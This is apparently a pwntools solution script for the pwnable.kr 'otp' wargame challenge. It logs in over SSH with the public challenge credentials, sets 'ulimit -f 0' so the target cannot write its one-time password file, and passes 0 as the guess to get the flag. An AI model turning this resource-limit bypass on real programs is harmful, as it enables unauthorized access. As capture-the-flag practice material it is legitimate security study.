#!/usr/bin/env python3

from pwn import *

io = ssh(host='pwnable.kr', user='otp', password='guest', port=2222)

# call ulimit to restrict write size for otp
#
# now the password will not be written to the file,
# so it will always be 0.
p = io.shell()
p.sendline(b'ulimit -f 0')
p.sendline(b'python -c \'import os; os.system("./otp 0")\'')

# Receive the flag
p.recvuntil(b'Congratz!')
p.recvline()
flag = p.recvline().decode().strip()

# Close the shell and ssh
p.close()
io.close()

log.success(f'Flag: {flag}')
